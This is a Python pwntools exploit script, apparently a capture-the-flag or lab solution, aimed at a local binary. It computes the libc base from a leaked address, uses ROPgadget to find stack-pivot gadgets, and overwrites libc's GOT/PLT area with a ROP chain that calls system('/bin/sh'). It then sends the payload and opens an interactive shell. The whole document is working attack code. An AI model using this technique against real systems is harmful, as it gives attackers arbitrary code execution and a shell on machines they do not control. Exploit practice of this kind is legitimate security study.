from pwn import *
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

from pathlib import Path
class ROPgadget():
    def __init__(self,libc: ELF,base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets",'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),stdout=fp)
            fp.close()
        fp = open("./gadgets",'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0],16),x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base  = base
    def search(self,s):
        for addr,ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr+self.base
        return None   
def fx2(libc: ELF, rop_chain = [],nudge=0):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc,libc.address)
    pivot = rop.search(r"^pop rsp ; ret")
    escape = rop.search(r"^pop rsp .*jmp rax")
    return got+8, flat(
        p64(got+8+0x38*8), # the rop chain address
        p64(pivot),
        p64(plt0) * 0x36, flat(rop_chain+[escape])+p64(got+0x3000-nudge*8))


libc    = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p       = process("../main")

base = int(p.readline(),16) - (0x7ff6a25244a0-0x7ff6a24c8000) - 0x4250
libc.address=base
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rax = rop.find_gadget(["pop rax",'ret'])[0]
rop_chain = [rdi,libc.search(b"/bin/sh").__next__(),rax,libc.sym["system"]]
dest, payload = fx2(
    libc,rop_chain=rop_chain,nudge=1)
success(hex(len(payload)))
context.arch='amd64'
p.send(p64(dest))
p.send(p64(len(payload)))
p.send(payload)
p.interactive()